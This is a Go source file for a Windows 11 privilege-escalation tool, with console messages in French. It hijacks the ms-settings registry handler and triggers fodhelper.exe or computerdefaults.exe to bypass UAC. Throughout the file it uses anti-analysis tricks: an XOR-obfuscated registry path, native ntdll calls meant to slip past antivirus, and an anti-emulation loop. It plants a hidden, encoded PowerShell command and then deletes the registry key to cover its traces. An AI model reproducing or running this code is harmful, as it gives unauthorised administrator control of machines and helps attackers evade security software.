//go:build windows

package main

import (
	"fmt"
	"os/exec"
	"syscall"
	"time"
	"unsafe"
)

// --- OBFUSCATION XOR ---
func xor(data []byte) string {
	for i := range data {
		data[i] ^= 0x42
	}
	return string(data)
}

var (
	// "Software\\Classes\\ms-settings\\Shell\\Open\\command" XORed (0x42)
	k1 = []byte{0x11, 0x2d, 0x24, 0x36, 0x35, 0x23, 0x30, 0x27, 0x1c, 0x01, 0x2e, 0x2e, 0x23, 0x31, 0x31, 0x27, 0x31, 0x1c, 0x2f, 0x31, 0x6f, 0x31, 0x27, 0x36, 0x36, 0x2b, 0x2c, 0x25, 0x31, 0x1c, 0x11, 0x2a, 0x27, 0x2e, 0x2e, 0x1c, 0x0d, 0x32, 0x27, 0x2c, 0x1c, 0x21, 0x2d, 0x2f, 0x2f, 0x23, 0x2c, 0x26}
)

// --- APIS NTDLL NATIVES ---
var (
	ntdll           = syscall.NewLazyDLL("ntdll.dll")
	procNtCreateKey = ntdll.NewProc("NtCreateKey")
	procNtSetValue  = ntdll.NewProc("NtSetValueKey")
	procNtClose     = ntdll.NewProc("NtClose")
	procRtlFormat   = ntdll.NewProc("RtlFormatCurrentUserKeyPath")
)

type UNICODE_STRING struct {
	Length        uint16
	MaximumLength uint16
	Buffer        *uint16
}

type OBJECT_ATTRIBUTES struct {
	Length                   uint32
	RootDirectory            syscall.Handle
	ObjectName               *UNICODE_STRING
	Attributes               uint32
	SecurityDescriptor       uintptr
	SecurityQualityOfService uintptr
}

func CheckAdmin() bool {
	cmd := exec.Command("net", "session")
	err := cmd.Run()
	return err == nil
}

// ExploitGhost : Version v10.2 - Native NT Hijack via ms-settings (Fodhelper triggered)
func ExploitGhost() bool {
	// 0. Anti-Emulation
	for i := 0; i < 1000000; i++ {
		_ = i * i
	}

	fmt.Println("[*] Phase 1 : Résolution dynamique SID (NT Native)...")

	var userKeyPath UNICODE_STRING
	retFormat, _, _ := procRtlFormat.Call(uintptr(unsafe.Pointer(&userKeyPath)))
	if retFormat != 0 {
		fmt.Printf("[-] Erreur RtlFormat : 0x%x\n", retFormat)
		return false
	}

	rawPath := syscall.UTF16ToString((*[1024]uint16)(unsafe.Pointer(userKeyPath.Buffer))[:userKeyPath.Length/2])
	fullRegistryPath := rawPath + "\\" + xor(k1)

	fmt.Println("[*] Phase 2 : Injection furtive Registry Hijack...")

	var hKey syscall.Handle
	uPath, _ := syscall.UTF16FromString(fullRegistryPath)
	uStr := UNICODE_STRING{
		Length:        uint16((len(uPath) - 1) * 2),
		MaximumLength: uint16(len(uPath) * 2),
		Buffer:        &uPath[0],
	}

	objAttr := OBJECT_ATTRIBUTES{
		Length:     uint32(unsafe.Sizeof(OBJECT_ATTRIBUTES{})),
		ObjectName: &uStr,
		Attributes: 0x40,
	}

	ret, _, _ := procNtCreateKey.Call(uintptr(unsafe.Pointer(&hKey)), 0xF003F, uintptr(unsafe.Pointer(&objAttr)), 0, 0, 0, 0)
	if ret != 0 {
		fmt.Printf("[-] Erreur NtCreateKey : 0x%x\n", ret)
		return false
	}
	defer procNtClose.Call(uintptr(hKey))

	// Injection du Payload dans (Default)
	// selfPath, _ := os.Executable()
	// Remplace le payload notepad par celui-ci
	encodedCmd := "dwBoAG8AYQBtAGkAIAA+ACAAQwA6AFwAcAB3AG4AZQBkAC4AdAB4AHQA"
	payload := "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand " + encodedCmd

	data, _ := syscall.UTF16FromString(payload)
	procNtSetValue.Call(uintptr(hKey), uintptr(0), 0, uintptr(1), uintptr(unsafe.Pointer(&data[0])), uintptr(len(data)*2))

	// Injection de DelegateExecute (Valeur vide - INDISPENSABLE sur Windows 11)
	valDel, _ := syscall.UTF16FromString("DelegateExecute")
	valDelStr := UNICODE_STRING{
		Length:        uint16((len(valDel) - 1) * 2),
		MaximumLength: uint16(len(valDel) * 2),
		Buffer:        &valDel[0],
	}
	empty, _ := syscall.UTF16FromString("")
	procNtSetValue.Call(uintptr(hKey), uintptr(unsafe.Pointer(&valDelStr)), 0, uintptr(1), uintptr(unsafe.Pointer(&empty[0])), uintptr(2))

	fmt.Println("[*] Phase 3 : Déclenchement via FODHELPER ou COMPUTERDEFAULTS...")
	// Essai avec fodhelper
	err := exec.Command("cmd.exe", "/c", "start", "fodhelper.exe").Run()
	if err != nil {
		fmt.Println("[*] Fodhelper a échoué, tentative via computerdefaults...")
		exec.Command("cmd.exe", "/c", "start", "computerdefaults.exe").Run()
	}

	fmt.Println("[*] Phase 4 : Nettoyage...")
	time.Sleep(10 * time.Second)
	exec.Command("reg", "delete", "HKCU\\"+xor(k1), "/f").Run()

	return true
}

func main() {
	fmt.Println("====================================================")
	fmt.Println("   Windows 11 PRIVESC [GHOST EDITION v10.2]")
	fmt.Println("   Target: Build 22631.6199 (Anti-AV Native)")
	fmt.Println("   Technique: NT API Hijack + FodHelper")
	fmt.Println("====================================================")

	if CheckAdmin() {
		fmt.Println("\n[+] ############################################")
		fmt.Println("[+] #     SUCCÈS : ÉLÉVATION DÉTECTÉE !        #")
		fmt.Println("[+] ############################################")
		fmt.Println("\n[*] Privilèges : SYSTEM / Administrator")

		fmt.Println("\nAppuyez sur Entrée pour quitter...")
		var input string
		fmt.Scanln(&input)
		return
	}

	fmt.Println("[!] État actuel : UTILISATEUR LIMITÉ")
	fmt.Println("[*] Tentative d'escalade furtive (GHOST v10.2)...")

	if ExploitGhost() {
		fmt.Println("\n[+] Injection terminée.")
		fmt.Println("[*] Une nouvelle session élevée devrait s'ouvrir.")
	} else {
		fmt.Println("[-] ÉCHEC : L'exploit a rencontré une erreur.")
	}

	fmt.Println("\nAppuyez sur Entrée pour quitter...")
	var input string
	fmt.Scanln(&input)
}
